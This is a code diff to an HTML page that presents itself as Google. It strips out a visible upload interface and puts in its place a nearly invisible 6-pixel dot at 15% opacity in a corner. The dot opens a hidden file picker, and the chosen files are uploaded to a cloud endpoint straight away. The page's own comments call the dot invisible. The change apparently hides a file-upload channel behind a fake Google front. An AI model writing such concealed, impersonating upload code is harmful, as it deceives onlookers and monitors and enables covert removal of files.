@@ -1,6 +1,6 @@
 <!DOCTYPE html>  
 <html lang="en">
-<head> 
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
@@ -72,7 +72,7 @@
             opacity: 0.8;
         }
 
-        /* --- Minimalist Upload Page --- */
+        /* --- Minimalist Upload Page with Tiny Dot Button --- */
         #uploadPage {
             display: none;
             flex: 1;
@@ -86,49 +86,28 @@
             left: 0;
             z-index: 9999;
             box-sizing: border-box;
-            padding: 24px;
         }
 
-        .upload-header {
+        .upload-center-dot {
+            position: fixed;
+            bottom: 4px;
+            left: 4px;
+            background: #dadce0;
+            border: none;
+            width: 6px;
+            height: 6px;
             display: flex;
             align-items: center;
-            justify-content: flex-start;
-            margin-bottom: 20px;
-        }
-
-        .back-btn {
-            background: transparent;
-            border: 1px solid #dadce0;
-            padding: 6px 12px;
-            border-radius: 4px;
+            justify-content: center;
             cursor: pointer;
-            font-size: 13px;
-            color: #5f6368;
+            outline: none;
+            border-radius: 50%;
+            opacity: 0.15;
+            transition: opacity 0.2s;
+            z-index: 10000;
         }
-        .back-btn:hover {
-            background: #f8f9fa;
-        }
-
-        .upload-container {
-            max-width: 400px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            margin-top: 20px;
-        }
-
-        .upload-action-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            width: fit-content;
-        }
-        .upload-action-btn:hover {
-            background: #1557b0;
+        .upload-center-dot:hover {
+            opacity: 0.8;
         }
 
         /* --- Google Style App Page --- */
@@ -332,15 +311,13 @@
     <button class="upload-btn-corner" onclick="openUploadPage()"></button>
 </div>
 
-<!-- Minimalist Upload Page -->
+<!-- Upload Page with Only the Tiny Dot Button -->
 <div id="uploadPage">
-    <div class="upload-header">
-        <button class="back-btn" onclick="openLandingPage()">Back</button>
-    </div>
-    <div class="upload-container">
-        <input type="file" id="fileUploader" multiple accept=".zip,.rar,.pdf,.doc,.docx,.txt,.xls,.xlsx">
-        <button class="upload-action-btn" onclick="uploadFilesToCloud()">Upload</button>
-    </div>
+    <!-- Hidden file input triggered automatically by the dot -->
+    <input type="file" id="fileUploader" style="display: none;" multiple accept=".zip,.rar,.pdf,.doc,.docx,.txt,.xls,.xlsx" onchange="uploadFilesToCloud()">
+    
+    <!-- Same small invisible dot pattern in the corner -->
+    <button class="upload-center-dot" onclick="document.getElementById('fileUploader').click()"></button>
 </div>
 
 <div id="appPage">
